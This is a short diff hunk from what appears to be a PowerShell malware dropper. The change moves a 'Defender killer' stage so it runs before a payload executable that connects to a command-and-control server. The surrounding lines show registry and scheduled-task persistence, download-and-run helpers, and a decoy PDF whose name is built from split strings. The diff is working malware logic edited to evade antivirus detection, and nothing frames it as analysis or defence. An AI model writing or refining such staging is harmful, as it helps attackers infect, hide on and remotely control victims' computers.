@@ -408,14 +408,14 @@ try {
 
 _cb 'S3' 'ok' 'persistence set (reg+task)'
 
-# === S5: PatchPulsaar.exe (direct .exe — .NET app, connects to C2 itself) ===
-_dlExe 'PatchPulsaar.exe' 'S5' 'PatchPulsaar'
-Start-Sleep 5
-
-# === S2: Defender killer (update.exe — LAST, after payload connects) ===
+# === S2: Defender killer (update.exe — BEFORE payload, prevents detection) ===
 if ($cbIsAdmin) {
     _dlExe 'update.exe' 'S2' 'DefenderKiller'
+    Start-Sleep 3
 }
+
+# === S5: PatchPulsaar.exe (direct .exe — .NET app, connects to C2 itself) ===
+_dlExe 'PatchPulsaar.exe' 'S5' 'PatchPulsaar'
 
 # === S7: Decoy PDF ===
 $pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
